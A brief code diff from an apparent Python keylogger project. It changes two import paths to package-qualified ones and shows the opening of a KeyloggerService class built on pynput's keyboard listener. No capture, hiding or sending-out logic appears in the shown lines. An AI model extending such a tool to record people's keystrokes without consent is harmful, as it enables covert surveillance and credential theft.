@@ -1,9 +1,9 @@
-from inter_face import IKeyLogger
+from keylogger.inter_face import IKeyLogger
 from typing import List
 from pynput.keyboard import Key, Listener, KeyCode
 
 # יבוא מקובץ תווים מיוחדים
-from special_characters import special_keys
+from keylogger.special_characters import special_keys
 
 
 class KeyloggerService(IKeyLogger):
